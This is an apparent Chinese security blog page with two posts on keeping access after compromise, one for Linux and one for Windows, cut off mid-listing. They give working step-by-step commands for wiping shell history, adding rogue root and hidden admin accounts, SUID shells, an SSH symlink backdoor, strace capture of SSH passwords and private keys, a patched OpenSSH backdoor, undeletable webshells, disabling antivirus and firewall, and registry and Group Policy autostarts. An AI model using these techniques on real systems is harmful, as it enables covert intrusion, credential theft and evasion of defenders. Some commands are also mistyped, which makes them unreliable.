-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]set +o history #备注：[space]表示空格。并且由于空格的原因，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure>
-
-<p>上面的命令会临时禁用历史功能，这意味着在命令之后执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p>
-<p>要重新开始历史功能，执行下面的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]set -o history #将环境恢复原状</span><br></pre></td></tr></table></figure>
-
-<p>从历史中删除指定的命令</p>
-<p>假设历史中已经记录了一些你不希望记录的命令。这种情况下可以通过以下命令来删除</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | grep &quot;keyword&quot;</span><br></pre></td></tr></table></figure>
-
-<p>输出了历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure>
-
-<p>删除大规模历史操作记录，这里，我们只保留前150行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217104438622.png" alt="image-20220217104438622"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217104544677.png" alt="image-20220217104544677"></p>
-<h1 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h1><h2 id="passwd写入"><a href="#passwd写入" class="headerlink" title="passwd写入"></a>passwd写入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd各部分含义</span><br><span class="line">用户名：密码：用户id：组id：身份描述：用户的家目录：用户登录后所使用的shell</span><br><span class="line">/etc/shadow各部分含义：</span><br><span class="line">用户名：密码的md5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的周期：口令失效以后账户会被锁定多少天：用户账号到期时间：保留字段尚未使用。</span><br></pre></td></tr></table></figure>
-
-<h2 id="写入举例："><a href="#写入举例：" class="headerlink" title="写入举例："></a>写入举例：</h2><h3 id="1-增加超级用户"><a href="#1-增加超级用户" class="headerlink" title="1.增加超级用户"></a>1.增加超级用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$echo &quot;momaek:savbSWc4rx8NY:hacker:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统都使用了shadow技术，把真正加密后的用户口令字段存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放了一个特殊的字符，例如”x”或者”*”.</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217105415478.png" alt="image-20220217105415478"></p>
-<p>但是该方法现在面对比较新的<code>liunx</code>系统基本用不了了，切换用户会提示该用户不存在。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217105450568.png" alt="image-20220217105450568"></p>
-<h3 id="2-如果系统不允许uid-0的用户远程登陆，可以增加一个普通用户账号"><a href="#2-如果系统不允许uid-0的用户远程登陆，可以增加一个普通用户账号" class="headerlink" title="2.如果系统不允许uid=0的用户远程登陆，可以增加一个普通用户账号"></a>2.如果系统不允许uid=0的用户远程登陆，可以增加一个普通用户账号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;momaek:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot; &gt;&gt; /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<p>ps：面对比较新的<code>liunx</code>系统该方法仍然失效</p>
-<h1 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h1><p>当一个文件所属主的X标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.SUID权限仅对二进制程序有效。</span><br><span class="line">2.执行者对于该程序需要具有x的可执行权限。</span><br><span class="line">3.本权限仅在该程序执行的过程中有效。</span><br><span class="line">4.在执行过程中执行者将具有该程序拥有者的权限。</span><br></pre></td></tr></table></figure>
-
-<p>创建suid权限的文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/.woot</span><br><span class="line">chmod 4755 /tmp/.woot</span><br><span class="line">ls -al /.woot</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217110925442.png" alt="image-20220217110925442"></p>
-<p>相当于我们复制了一些新的bash到tmp目录下，然后可以在使用它的时候调用root的权限。</p>
-<p>使用一般用户运行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/tmp/.woot</span><br><span class="line">/tmp/.woot -p  //bash2针对suid有一些保护措施，使用-p参数来获取一个root shell</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217111224910.png" alt="image-20220217111224910"></p>
-<p>要想查找到具有suid的权限的应用，可以使用如下命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm +4000 -ls</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217111658816.png" alt="image-20220217111658816"></p>
-<h1 id="SSH公私钥"><a href="#SSH公私钥" class="headerlink" title="SSH公私钥"></a>SSH公私钥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -keygan -t rsa //生成公钥</span><br><span class="line">echo id_rsa.pub &gt;&gt; .ssh/authorized_keys //将id_rsa.pub内容放到目标.ssh/authorized_keys里</span><br></pre></td></tr></table></figure>
-
-<h1 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h1><p>通过软连接建立一个ssh后门：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345</span><br></pre></td></tr></table></figure>
-
-<p>说明：建立软连接到/usr/local/su 文件，也可以在其他目录，su文件名字不能变，变了就无法登录。当然可以通过其他设置，更改su名字也是可以的。然后启动，并指定监听12345端口，登录的时候密码随意即可，登陆如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@xxx.xxx.xxx.xxx -p 12345</span><br></pre></td></tr></table></figure>
-
-<p>注意：这个如果目标在执行软连接的时候，如果使用了其他账号创建，则登录的时候需要使用对应的账号，而非root。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217113746712.png" alt="image-20220217113746712"></p>
-<p>（以上时另一台机器成功连接的截图）</p>
-<p>上面提到要更改软连接su名字，需要用以下命令，xxxxxx为你需要更改的名字:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;</span><br><span class="line"> #%PAM-1.0</span><br><span class="line"> auth sufficient pam_rootok.so</span><br><span class="line"> auth include system-auth</span><br><span class="line"> account include system-auth</span><br><span class="line"> password include system-auth</span><br><span class="line"> session include system-auth &quot; &gt;&gt; /etc/pam.d/xxxxxx</span><br></pre></td></tr></table></figure>
-
-<p>之后再开启端口监听，用于登录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/xxxxxx;/tmp/xxxxxx -oPort=12345</span><br></pre></td></tr></table></figure>
-
-<p>当然，也可以使用其他软连接名字，但是文件必须得在/etc/pam.d目录下存在。在/etc/pam.d目录下执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ |xargs grep &quot;pam_rootok&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217113900829.png" alt="image-20220217113900829"></p>
-<p>出现了以上内容，说明以下的名字都可以作为软连接名称：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oPort=23333</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oPort=23334</span><br><span class="line">ln -sf /usr/sbin/runuser /tmp/chsh;/tmp/runuser -oPort=23335</span><br></pre></td></tr></table></figure>
-
-<h1 id="Strace"><a href="#Strace" class="headerlink" title="Strace"></a>Strace</h1><p>strace是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把它当作一个键盘记录的后门，来扩大我们的信息收集范围</p>
-<p>通过其他方式拿到shell，通过histroy，流量抓包、或者本地没有翻到密码的情况下。我们要想获取当前主机的密码，或者是通过这台主机连接到其他主机的密码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yun -y install strace</span><br></pre></td></tr></table></figure>
-
-<h2 id="记录sshd进程明文密码"><a href="#记录sshd进程明文密码" class="headerlink" title="记录sshd进程明文密码"></a>记录sshd进程明文密码</h2><p>执行如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e</span><br><span class="line">trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)、</span><br></pre></td></tr></table></figure>
-
-<p>当用户通过密码登陆时，使用如下命令查看记录的密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E &#x27;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>
-
-<h2 id="记录sshd私钥"><a href="#记录sshd私钥" class="headerlink" title="记录sshd私钥"></a>记录sshd私钥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e</span><br><span class="line">trace=read,write -s 4096 2&gt; /tmp/.sshd.log &amp;)</span><br></pre></td></tr></table></figure>
-
-<p>当用户通过私钥登陆时，使用如下命令查看记录的私钥</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#x27;PRIVATE KEY&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="OpenSSH后门"><a href="#OpenSSH后门" class="headerlink" title="OpenSSH后门"></a>OpenSSH后门</h1><p>[openssh-5.9p1.tar.gz]</p>
-<p>[openssh-5.9p1.patch.tar.gz]</p>
-<h2 id="编辑安装"><a href="#编辑安装" class="headerlink" title="编辑安装"></a>编辑安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxvf openssh-5.9p1.patch.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/ 复制patch后⻔⽂件到正常openssh⾥⾯</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br></pre></td></tr></table></figure>
-
-<h2 id="修改后门密码和文件记录"><a href="#修改后门密码和文件记录" class="headerlink" title="修改后门密码和文件记录"></a>修改后门密码和文件记录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@localhost openssh-5.9p1# vim includes.h</span><br><span class="line">int secret_ok;</span><br><span class="line">FILE *f;</span><br><span class="line">#define ILOG &quot;/tmp/ilog&quot; # 记录登录到本机的⽤户名和密码</span><br><span class="line">#define OLOG &quot;/tmp/olog&quot; # 记录本机登录到远程的⽤户名和密码</span><br><span class="line">#define SECRETPW &quot;ms0806&quot; # 远程连接密码</span><br><span class="line">#endif /* INCLUDES_H */</span><br></pre></td></tr></table></figure>
-
-<h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><p>首先对ssh里面的几个key的权限进行修改，否则可能进行编译的时候key不能修改而报错。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 620 moduli</span><br><span class="line">chmod 600 sshd_config ssh_host_ecdsa_key ssh_host_rsa_key</span><br><span class="line">chmod 644 ssh_config ssh_host_ecdsa_key.pub ssh_host_rsa_key.pub</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装环境编译运行"><a href="#安装环境编译运行" class="headerlink" title="安装环境编译运行"></a>安装环境编译运行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openssl openssl-devel pam-devel zlib zlib-devel</span><br><span class="line">./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">systemctl restart sshd.service</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>我们的OpenSSH后⻔已经设置成功。使⽤我们的后⻔密码可以正常登陆，以前的密码也有记录。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/17/Liunx%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Windows权限维持" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/15/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">Windows权限维持</a>
-    </h1>
-  
-
-        
-        <a href="/2022/02/15/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="archive-article-date">
-  	<time datetime="2022-02-15T02:10:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h1><p>权限维持是一项必要且需要得技巧，当在外网中打点后，需要保证点的持久性，使团队能够专注于目标，而不会失去指挥和控制服务器的通信。</p>
-<h1 id="隐藏的技巧"><a href="#隐藏的技巧" class="headerlink" title="隐藏的技巧"></a>隐藏的技巧</h1><h2 id="“真正”隐藏文件"><a href="#“真正”隐藏文件" class="headerlink" title="“真正”隐藏文件"></a>“真正”隐藏文件</h2><p>使用<code>attrib+s+a+h+r</code>命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attrib+s +a +h +r </span><br></pre></td></tr></table></figure>
-
-<p>测试如下：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215102202085.png" alt="image-20220215102202085"></p>
-<p>在当前目录输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attrib+s +a +h +r test</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215102246479.png" alt="image-20220215102246479"></p>
-<p>test文件夹成功消失，命令行和界面里都没有了。</p>
-<p>接下来仍然可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attrib-s -a -h -r test</span><br></pre></td></tr></table></figure>
-
-<p>恢复该文件的正常属性。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215102409316.png" alt="image-20220215102409316"></p>
-<p>就又回来了</p>
-<h2 id="系统文件夹图标"><a href="#系统文件夹图标" class="headerlink" title="系统文件夹图标"></a>系统文件夹图标</h2><ol>
-<li>建一个文件夹，假设叫“我的电脑”</li>
-<li>然后把要存放的文件放在里面</li>
-<li>给文件夹重新命名为“我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}”</li>
-</ol>
-<p>测试如下：</p>
-<p>在test文件夹里新建一个test.txt，将test文件夹重命名为“我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}”。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215102702283.png" alt="image-20220215102702283"></p>
-<p>接下来就会生成这样的，点进去后发现跳转到我的电脑界面，并且该文件因为是系统文件夹涉及到注册表等还无法删除，或者重命名后面的字段（图形化界面中）。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215102731176.png" alt="image-20220215102731176"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215103734121.png" alt="image-20220215103734121"></p>
-<p>但是此方法在cmd里面使用dir可以查看到，也能通过cd进入真正的文件夹。</p>
-<p>下面是代号:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">　　我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">　　回收站.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125;</span><br><span class="line">　　拔号⽹络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125;</span><br><span class="line">　　打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125;</span><br><span class="line">　　控制⾯板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125;</span><br><span class="line">　　⽹上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="畸形目录"><a href="#畸形目录" class="headerlink" title="畸形目录"></a>畸形目录</h2><p>只需要在目录名后面加两个点或者多个点。用户图形界面无法访问。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建目录：md test...\            //在目录中显示为test...，也有可能会显示为test..，随系统版本而定。</span><br><span class="line">复制文件：copy test.txt  a...\test.txt</span><br><span class="line">删除目录：rd /s/q test...\</span><br></pre></td></tr></table></figure>
-
-<p>在win11中，该目录点击后没有反应</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215104818865.png" alt="image-20220215104818865"></p>
-<p>在注册表中，也不能使用cd命令进入</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215104859761.png" alt="image-20220215104859761"></p>
-<p>那么我们该怎么访问里面的文件呢，答案是通过浏览器来访问。在本地开一个http服务，然后通过浏览器，可以直接访问到里面的文件。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215105102105.png" alt="image-20220215105102105"></p>
-<h2 id="创建无法删除的webshell"><a href="#创建无法删除的webshell" class="headerlink" title="创建无法删除的webshell"></a>创建无法删除的webshell</h2><p>windows系统中，不能使用某些系统保留名来创建文件\文件夹，包括aux,com1,com2,prn,con和nul等，但是这些是可以通过cmd来创建的，并且使用copy命令就可以实现。</p>
-<p>测试如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">F:\kcon&gt;copy test.txt aux.asp</span><br><span class="line">已复制         1 个文件。</span><br><span class="line">F:\kcon&gt;dir</span><br><span class="line"> 驱动器 F 中的卷是 F</span><br><span class="line"> 卷的序列号是 426C-9176</span><br><span class="line"></span><br><span class="line"> F:\kcon 的目录</span><br><span class="line"></span><br><span class="line">02/15/2022  11:00 AM    &lt;DIR&gt;          .</span><br><span class="line">02/15/2022  10:55 AM                 7 aux.asp</span><br><span class="line">11/05/2021  07:16 PM         8,045,026 Container escape in 2021.pdf</span><br><span class="line">11/05/2021  07:16 PM         4,313,885 Fairplay Play DRM.pdf</span><br><span class="line">02/15/2022  10:55 AM                 7 test.txt</span><br><span class="line">11/05/2021  07:16 PM         8,210,308 高级攻防演练下的Webshell.pdf</span><br><span class="line">               5 个文件     20,569,233 字节</span><br><span class="line">               1 个目录 56,456,802,304 可用字节</span><br><span class="line">               </span><br><span class="line">F:\kcon&gt;del aux.asp</span><br></pre></td></tr></table></figure>
-
-<p>利用系统保留文件名创建无法删除的webshell，这类文件无法再图形界面删除，但是可以在命令行下删除，然而在IIS中，这种文件也可以解析。</p>
-<h2 id="驱动级文件隐藏"><a href="#驱动级文件隐藏" class="headerlink" title="驱动级文件隐藏"></a>驱动级文件隐藏</h2><p>驱动级文件隐藏可以通过一些软件来实现，比如 <a target="_blank" rel="noopener" href="http://xoslab.com/efl.html">Easy File Locker</a></p>
-<p>该方法促成的效果就是可以让文件不会显示，不能通过列目录列出来，也不能删除，除非知道完整的路径，你才可以读取文件内容。</p>
-<h1 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h1><p>拿到目标的shell后，我们做的第一件事情就是关闭目标主机的杀毒软件，通过命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run killav  //meterperter中使用</span><br><span class="line">netsh advfirewall set allprofiles state off //关闭防火墙</span><br><span class="line">net stop windefend //关闭windowsdefender</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h1><p>组策略后门比较起其他的后门更加隐蔽。往注册表中添加相应的键值实现随系统启动而运行的木马就是一个木马运行的常用例子。其实组策略也可以实现该功能，而且它还可以在系统关机的时候进行某种操作。这就是通过组策略的”脚本（启动/关机）“项目来实现的。具体的位置在”计算机配置-&gt;windows设置“项下。</p>
-<p>测试如下：</p>
-<p>在虚拟机里面新建一个txt，输入以下内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo off</span><br><span class="line">net user hack$ test168 /add</span><br><span class="line">net localgroup administrators hack$ /add</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
-
-<p>重命名为add.bat，接着在win+r对话框中输入⼊<code>gpedit.msc</code>，定位到”计算机配置-&gt;windows设置-&gt;脚本(启动/关机）“，双击右边窗口的关机，在其中添加add.bat。就是说当系统关机时创建hack$用户。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220215114014868.png" alt="image-20220215114014868"></p>
-<p>对于组策略后门还有各种各样的利用方法，攻击者通过它来运行脚本或者程序，嗅探管理员密码等等。当他们获取了管理员的密码后，就可以直接利用管理员账户远程登陆系统。</p>
-<h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><p>在windows登录期间创建将执行任意负载的注册表项是老生常谈的话题，也是经典手段之一。这种持久性技术需要创建注册表，而各种渗透工具都提供了这种能力。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册表项可以从终端添加到运行键以实现持久性。这些键将包含用户登录时将执行的实际负载的引用</span><br></pre></td></tr></table></figure>
-
-<p>命令行中我们可以输入以下命令来添加注册表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v</span><br><span class="line">Pentestlab /t REG_SZ /d &quot;C:\Users\pte1\Donwloads\pentestlab.exe&quot;  </span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; /v</span><br><span class="line">Pentestlab /t REG_SZ /d &quot;C:\Users\pte1\Donwloads\pentestlab.exe&quot;</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&quot; /v</span><br><span class="line">Pentestlab /t REG_SZ /d &quot;C:\Users\pte1\Donwloads\pentestlab.exe&quot;</span><br><span class="line">reg add</span><br><span class="line">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&quot; /v</span><br><span class="line">Pentestlab /t REG_SZ /d &quot;C:\Users\pte1\Donwloads\pentestlab.exe&quot;</span><br></pre></td></tr></table></figure>
-
-<p>以上是添加当前用户的Run键。</p>
-<p>如果已经获得system权限的shell，则最好使用本地计算机注册表位置。这样就无论谁登录，都可以进行执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v</span><br><span class="line">Pentestlab /t REG_SZ /d &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span><br><span class="line">/v Pentestlab /t REG_SZ /d &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">reg add</span><br><span 